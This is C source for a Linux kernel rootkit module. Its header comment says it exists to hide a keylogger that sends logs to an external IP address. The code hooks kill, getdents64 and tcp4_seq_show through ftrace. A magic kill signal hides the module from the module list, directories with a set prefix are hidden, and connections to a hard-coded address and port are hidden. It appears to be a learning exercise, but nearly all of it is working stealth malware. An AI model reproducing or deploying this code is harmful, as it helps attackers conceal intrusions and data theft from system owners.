/*
 * The big final rootkit that will initialize the keylogger, hide the resultant
 * process, hide itself, hide the directories that it exists in, and hide
 * the network activity of the logger as it sends logs to an external IP
 * address.
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/module.h>
#include <linux/dirent.h>
#include <linux/tcp.h>

#include <net/tcp.h>
#include <net/sock.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Alvin (guided with XCellerator");
MODULE_DESCRIPTION("Rootkit hiding itself");
MODULE_VERSION("0.01");


// tracking variables: hiding rootkit.
static int hidden = 0;
static struct list_head *hiding_spot;

#ifdef MODULE
extern struct module __this_module;
#define THIS_MODULE (&__this_module)
#else
#define THIS_MODULE ((struct module*)0)
#endif

// tracking variables: hiding directories.
static int dir_hiding = 0;

void hide_me(void){
	hiding_spot = THIS_MODULE->list.prev;
	list_del(&(THIS_MODULE->list));
	printk(KERN_INFO "Going into hiding...\n");
}

void show_me(void){
	list_add(&(THIS_MODULE->list),hiding_spot);
	printk(KERN_INFO "Coming out of hiding...\n");
}

// The hooks and tracking variables needed to hide directories
#define PREFIX "XxHidethisxX"

static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);

asmlinkage int hook_getdents64(const struct pt_regs *regs){
  struct linux_dirent64 __user *dirent = (struct linux_dirent64*)regs->si;
  struct linux_dirent64 *current_dir, *prev_dir, *dirent_scratch = NULL;
  int offset = 0;
  long error;

  int ret = orig_getdents64(regs);
	if (!dir_hiding){
		return ret;
	}
	
  dirent_scratch = kzalloc(ret, GFP_KERNEL);

  if( ret <=0 || dirent_scratch==NULL ){
    return ret;
  }

  error = copy_from_user(dirent_scratch, dirent, ret);
  if(error){
    goto done;
  }

  while(offset < ret){
    current_dir = (void*)dirent_scratch + offset;

    if (memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0){
      printk(KERN_INFO "Found directory %s.\n", current_dir->d_name);
      if (current_dir == dirent_scratch){
        ret -= current_dir->d_reclen;
        memmove(current_dir, (void*)current_dir + current_dir->d_reclen, ret);
        continue;
      }
      else{
        prev_dir->d_reclen += current_dir->d_reclen;
      }
    }
    else{
      prev_dir = current_dir;
    }

    offset += current_dir->d_reclen;

  }

  error = copy_to_user(dirent, dirent_scratch, ret);
  if(error){
    goto done;
  }

done:
  kfree(dirent_scratch);
  return ret;
}



/* the kill signal will toggle hiding the rootkit: kill -64 will
 * hide the rootkit itself. Extra functionality for toggling hiding processes
 * hiding files, and hiding network activity.
 */
 #define ADDRESS "10.0.2.15"
static asmlinkage long (*orig_kill)(const struct pt_regs *regs);

asmlinkage int hook_kill(const struct pt_regs *regs){
	int sig = regs->si;
	if(sig == 64 && !hidden){
		hide_me();
		hidden = 1;
		dir_hiding = 1;
		return 0;
	}
	else if(sig == 64 && hidden){
		show_me();
		hidden = 0;
		dir_hiding = 0;
		return 0;
	}
	return orig_kill(regs);
}

/* The hook_tcp4_seq_show function checks if the malicious 
 * port is in use and hides it if it is. 
 */
static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file* seq, void* v);

static asmlinkage long hook_tcp4_seq_show(struct seq_file* seq, void* v) {
  struct sock *sk =  v; 
  int max_ip_len = 16; 
  char foreign_ip_str[16];
  char local_ip_str[16];
  int bytes_written = 0; 
  if (sk != (struct sock*)0x1) {
    printk(KERN_INFO "Foreign addr: %pI4 state: %d\n", &sk->sk_daddr, sk->sk_state);
    printk(KERN_INFO "Local addr: %pI4\n", &sk->sk_rcv_saddr);
    
    bytes_written = snprintf(foreign_ip_str, max_ip_len, "%pI4", &sk->sk_daddr);
    printk(KERN_INFO "Sucessfully wrote ip string %s\n", foreign_ip_str);
    if (bytes_written < 0) {
      printk(KERN_INFO "Could not write foreign ip string\n");
    }

    // Check if ip matches local machine. For the case where the server is the 
    // local machine.
    bytes_written = snprintf(local_ip_str, max_ip_len, "%pI4", &sk->sk_rcv_saddr);
    printk(KERN_INFO "Sucessfully wrote ip string %s\n", local_ip_str);
    if (bytes_written < 0) {
      printk(KERN_INFO "Could not write local ip string\n");
    }

    // Check if client or server ip matches malicious ADDRESS.
    if (strcmp(foreign_ip_str, ADDRESS) == 0 || strcmp(local_ip_str, ADDRESS) == 0) {
      return 0;
    } 

  }

  if (sk != (struct sock*)0x1 && sk->sk_num == 0x1f90) {
    return 0;
  }

  if (sk != (struct sock*)0x1) {
    printk(KERN_INFO "Running original tcp4\n");
  }
  return orig_tcp4_seq_show(seq, v);
}


//The hooking structure: for every syscall we want to hijack,
//we put in one more entry into this ftrace_hook struct array:
//HOOK([string name of syscall],literally just the method name
//of the hijacked func, (static)address of space to put original func)

static struct ftrace_hook hooks[] = {
	HOOK("sys_kill", hook_kill, &orig_kill),
  HOOK("sys_getdents64", hook_getdents64, &orig_getdents64),
  HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
};


int __init my_init(void){

	int err;
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if(err){
		return err;
	}

	printk(KERN_INFO "Big kit loaded!\n");
	return 0;
}

void __exit my_exit(void){
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "exiting Big kit!\n");
}

module_init(my_init);
module_exit(my_exit);
